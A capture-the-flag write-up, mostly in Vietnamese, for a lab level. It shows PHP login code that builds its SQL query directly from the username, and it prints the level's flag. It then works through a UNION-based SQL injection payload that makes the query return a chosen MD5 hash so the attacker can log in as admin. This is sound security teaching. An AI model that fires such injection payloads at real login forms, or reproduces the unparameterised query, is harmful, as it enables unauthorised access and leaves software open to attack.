# **Level 5:**
```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username, password FROM users WHERE username='$username'";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Username not found"; // No result

		$login_user = $row["username"];
		$login_password = $row["password"];

		if ($login_password !== md5($password))
			return "Wrong username or password";

		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{3fa996e38acc675ae51fef858dc35eb3}, but how about <a href='level6.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```

Ở Lv5 , nó kiểm tra mật khẩu nhập vào có bằng với password đã Hash md5 ở trong Database hay không

Và nếu đăng nhập được với tư cách là `admin` thì sẽ ra flag bài này

Vấn đề cần bypass ở đây là cái mật khẩu . Nếu chúng ta muốn kết quả trả về từ database trùng với cái mật khẩu nhập vào thì cần phải 
```
union select 12345 -- -
```
Như vậy kết quả sau truy vấn sẽ trả về là 123123 . Rồi nếu chúng ta nhập vào ở ô password là 123123 thì cái nhập vào cũng bằng với cái được trả về từ database . Nhưng ở đây nó lại hash cái pass nhập vào rồi mới so sánh . Tức là
```
Đây là cái nhập vào bị hash ---> Hash('12345') vs   12345 <----- Đây là kết quả từ database trả về
```
Vậy thì Trước tiên chúng ta phải hash cái 12345 rồi bỏ vào trong câu truy vấn và cái password chúng ta sẽ nhập 12345. 

Thì lúc đó sẽ được
```
Đây là cái nhập vào bị hash ---> Hash('12345') = 827ccb0eea8a706c4c34a16891f84e7b <----- Đây là kết quả từ database trả về
```
Và payload sẽ là: 
```sql
username: ' union select 'admin','827ccb0eea8a706c4c34a16891f84e7b' -- -
password: 12345
```

<img width="1496" height="805" alt="image" src="https://github.com/user-attachments/assets/6db21297-9111-4841-941b-fd5c54b7f7f6" />
